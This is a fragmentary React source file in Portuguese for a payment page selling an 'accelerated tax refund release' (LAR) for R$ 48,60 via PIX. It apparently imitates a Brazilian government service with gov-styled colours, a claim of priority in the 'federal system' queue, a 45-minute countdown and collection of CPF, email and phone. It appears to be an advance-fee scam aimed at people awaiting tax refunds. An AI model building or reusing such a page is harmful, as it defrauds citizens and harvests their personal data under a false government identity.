...
import { Clipboard, Copy, AlertCircle, Loader2, CheckCircle2, Clock, ArrowRight } from "lucide-react";
...
export default function PagamentoLAR() {
  ...
  const [status, setStatus] = useState<"loading" | "success" | "paid" | "error" | "skipped">("loading");
  const [tempoRestante, setTempoRestante] = useState<number>(2700); // 45 minutos em segundos
  ...
  const dataPagamento = searchParams.get("dataPagamento") || (new Date()).toISOString();
  ...
  const pularEtapa = () => {
    ...
    // Redirecionar para a página de Sucesso Final
    ...
    params.append('pagamento_id', pagamentoAnterId);
    params.append('dataPagamento', dataPagamento);
    params.append('tipo', 'normal');
    
    setTimeout(() => {
      setLocation(`/sucesso-final?${params.toString()}`);
    }, 2000);
  };
  ...
  const gerarPagamentoPix = async () => {
    try {
      ...
      const paymentData = {
        amount: 48.60, // R$ 48,60
        name: nome,
        email: email,
        cpf: cpf,
        phone: telefone,
        title: "Liberação Acelerada de Restituição (LAR)"
      };
          ...
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <div className="text-center mb-8">
              ...
              <p className="text-[var(--gov-gray-dark)] max-w-2xl mx-auto">
                Esta é uma etapa <span className="font-semibold">opcional</span> que acelera o processamento da sua restituição para 
                recebimento em até 60 minutos após a confirmação.
              </p>
            </div>
              ...
              <Card className="border-green-200 h-full">
                <CardHeader className="bg-green-50 border-b border-green-200">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-green-800 text-lg">Informações do Pagamento</CardTitle>
                ...
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    ...
                    <span className="font-medium">Liberação Acelerada de Restituição</span>
                  </div>
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    <span className="text-sm text-gray-500">Valor:</span>
                    <span className="font-medium text-green-600">R$ 48,60</span>
                  </div>
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
              ...
              <Card className="border-gray-200">
                ...
                <CardContent className="flex flex-col items-center pt-6">
                      ...
                      <div className="w-full">
                        ...
                        <div className="mt-4 text-center">
                          ...
                          >
                            ...
                            Não quero processamento acelerado
                          </Button>
                        </div>
                      </div>
                    </>
                  ...
                  {status === "skipped" && (
                    <div className="flex flex-col items-center justify-center py-8">
                      ...
                      <h3 className="text-lg font-bold text-blue-700 mb-2">Processamento Normal Selecionado</h3>
                      <p className="text-gray-600 text-center">
                        Você optou pelo processamento normal da restituição.
                        <br />Você será redirecionado em instantes...
                      </p>
                      <div className="mt-4">
                        <Loader2 className="h-5 w-5 text-blue-500 animate-spin" />
                ...
                <CardFooter className="bg-gray-50 border-t border-gray-200 flex flex-col">
                  <p className="text-sm text-gray-500 mb-2">
                    <span className="font-medium">Importante:</span> Esta taxa é opcional e fica disponível por 45 minutos.
                  </p>
                </CardFooter>
              </Card>
            </div>
            ...
            <div className="bg-green-50 border border-green-200 rounded-lg p-5 mb-6">
              <h3 className="text-lg font-semibold text-green-800 mb-3">
                Vantagens da Liberação Acelerada de Restituição (LAR)
              </h3>
              <div className="text-green-700 space-y-3">
                <p>
                  A Liberação Acelerada de Restituição é uma opção para quem deseja receber seu valor com prioridade:
                </p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>Processamento prioritário na fila de pagamentos do sistema federal</li>
                  <li>Liberação do valor em até 60 minutos após confirmação</li>
                  <li>Confirmação rápida por SMS e e-mail sobre a liberação</li>
                  <li>Atendimento prioritário em caso de dúvidas ou problemas</li>
                </ul>
                <p className="pt-2">
                  <span className="font-semibold">Este serviço é totalmente opcional.</span> Caso opte por não realizar o pagamento, 
                  sua restituição será processada normalmente no prazo regular de até 30 dias úteis.
                </p>
              </div>
            </div>
              ...
              <div className="flex justify-between items-center">
                <div className="text-sm text-gray-500">
                  {verificandoPagamento ? (
                    ...
                    <span>Aguardando pagamento PIX (opcional)</span>
                  )}
                </div>
                <div>
